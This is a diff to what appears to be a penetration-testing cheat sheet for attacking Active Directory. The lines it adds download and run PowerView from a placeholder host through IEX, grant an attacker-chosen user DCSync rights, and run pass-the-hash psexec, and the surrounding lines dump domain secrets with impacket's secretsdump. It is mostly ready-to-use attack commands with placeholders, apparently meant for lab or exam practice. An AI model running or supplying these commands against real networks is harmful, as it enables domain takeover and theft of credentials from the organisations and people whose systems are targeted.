@@ -618,9 +618,16 @@ sudo ./usr/bin/neo4j console
 # LHOST
 ./BloodHound  --no-sandbox
 
+IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/PowerView.ps1")
+$pass = convertto-securestring '{PASSWORD}' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USERNAME}', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC={DOMAIN1},DC={DOMAIN2}" -PrincipalIdentity {USERNAME} -Rights DCSync
+
 # Dump secrets
 sudo python3 ./usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USERNAME}':'{PASSWORD}'@{IP ADDRESS}
 
+# PSEXEC
+sudo python3 psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
 
 
 
